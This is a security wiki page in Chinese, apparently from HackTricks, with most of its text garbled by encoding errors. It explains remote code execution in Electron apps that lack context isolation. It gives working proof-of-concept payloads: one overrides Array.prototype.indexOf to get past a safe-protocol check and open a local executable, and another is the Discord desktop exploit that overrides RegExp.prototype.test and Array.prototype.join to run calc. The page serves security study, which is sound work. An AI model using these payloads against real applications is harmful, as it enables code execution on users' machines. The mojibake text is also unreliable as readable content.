# Electron contextIsolation RCE via preload code

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## ç¤ºä¾‹ 1

æ¥è‡ª [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30) çš„ç¤ºä¾‹

æ­¤ä»£ç ä½¿ç”¨é»˜è®¤æµè§ˆå™¨æ‰“å¼€ http(s) é“¾æ¥ï¼š

![](<../../../.gitbook/assets/image (768).png>)

ç±»ä¼¼ `file:///C:/Windows/systemd32/calc.exe` çš„å†…å®¹å¯ä»¥ç”¨æ¥æ‰§è¡Œè®¡ç®—å™¨ï¼Œ`SAFE_PROTOCOLS.indexOf` æ­£åœ¨é˜²æ­¢è¿™ç§æƒ…å†µã€‚

å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ XSS æˆ–ä»»æ„é¡µé¢å¯¼èˆªæ³¨å…¥æ­¤ JS ä»£ç ï¼š
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
```
ç”±äºå¯¹ `SAFE_PROTOCOLS.indexOf` çš„è°ƒç”¨å°†å§‹ç»ˆè¿”å› 1337ï¼Œæ”»å‡»è€…å¯ä»¥ç»•è¿‡ä¿æŠ¤å¹¶æ‰§è¡Œ calcã€‚æœ€ç»ˆåˆ©ç”¨ï¼š
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```
æ£€æŸ¥åŸå§‹å¹»ç¯ç‰‡ä»¥è·å–å…¶ä»–æ— éœ€æç¤ºæƒé™å³å¯æ‰§è¡Œç¨‹åºçš„æ–¹æ³•ã€‚

æ˜¾ç„¶ï¼ŒåŠ è½½å’Œæ‰§è¡Œä»£ç çš„å¦ä¸€ç§æ–¹æ³•æ˜¯è®¿é—®ç±»ä¼¼ `file://127.0.0.1/electron/rce.jar` çš„å†…å®¹ã€‚

## ç¤ºä¾‹ 2ï¼šDiscord åº”ç”¨ RCE

æ¥è‡ª [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)

åœ¨æ£€æŸ¥é¢„åŠ è½½è„šæœ¬æ—¶ï¼Œæˆ‘å‘ç° Discord æš´éœ²äº†ä¸€ä¸ªå‡½æ•°ï¼Œå…è®¸é€šè¿‡ `DiscordNative.nativeModules.requireModule('MODULE-NAME')` åœ¨ç½‘é¡µä¸­è°ƒç”¨æŸäº›å…è®¸çš„æ¨¡å—ã€‚\
åœ¨è¿™é‡Œï¼Œæˆ‘æ— æ³•ç›´æ¥ä½¿ç”¨å¯ä»¥ç”¨äº RCE çš„æ¨¡å—ï¼Œä¾‹å¦‚ _child\_process_ æ¨¡å—ï¼Œä½†æˆ‘ **å‘ç°äº†ä¸€æ®µä»£ç ï¼Œé€šè¿‡é‡å†™ JavaScript å†…ç½®æ–¹æ³•** å¹¶å¹²æ‰°æš´éœ²æ¨¡å—çš„æ‰§è¡Œï¼Œå¯ä»¥å®ç° RCEã€‚

ä»¥ä¸‹æ˜¯ PoCã€‚æˆ‘èƒ½å¤Ÿç¡®è®¤ï¼Œå½“æˆ‘ **è°ƒç”¨åœ¨ devTools ä¸­åä¸º "_discord\_utils_" çš„æ¨¡å—ä¸­å®šä¹‰çš„ `getGPUDriverVersions` å‡½æ•°** æ—¶ï¼Œ**calc** åº”ç”¨ç¨‹åºä¼š **å¼¹å‡º**ï¼ŒåŒæ—¶ **é‡å†™ `RegExp.prototype.test` å’Œ `Array.prototype.join`**ã€‚
```javascript
RegExp.prototype.test=function(){
return false;
}
Array.prototype.join=function(){
return "calc";
}
DiscordNative.nativeModules.requireModule('discord_utils').getGPUDriverVersions();
```
`getGPUDriverVersions` å‡½æ•°å°è¯•é€šè¿‡ä½¿ç”¨ "_execa_" åº“æ¥æ‰§è¡Œç¨‹åºï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```javascript
module.exports.getGPUDriverVersions = async () => {
if (process.platform !== 'win32') {
return {};
}

const result = {};
const nvidiaSmiPath = `${process.env['ProgramW6432']}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`;

try {
result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []));
} catch (e) {
result.nvidia = {error: e.toString()};
}

return result;
};
```
é€šå¸¸ï¼Œ_execa_ å°è¯•æ‰§è¡Œ "_nvidia-smi.exe_"ï¼Œè¯¥è·¯å¾„åœ¨ `nvidiaSmiPath` å˜é‡ä¸­æŒ‡å®šï¼Œä½†ç”±äºé‡å†™çš„ `RegExp.prototype.test` å’Œ `Array.prototype.join`ï¼Œ**å‚æ•°åœ¨ \_execa**\_** çš„å†…éƒ¨å¤„ç†è¿‡ç¨‹ä¸­è¢«æ›¿æ¢ä¸º "**_**calc**_**"**ã€‚

å…·ä½“æ¥è¯´ï¼Œå‚æ•°é€šè¿‡æ›´æ”¹ä»¥ä¸‹ä¸¤ä¸ªéƒ¨åˆ†è¢«æ›¿æ¢ã€‚

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36)

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
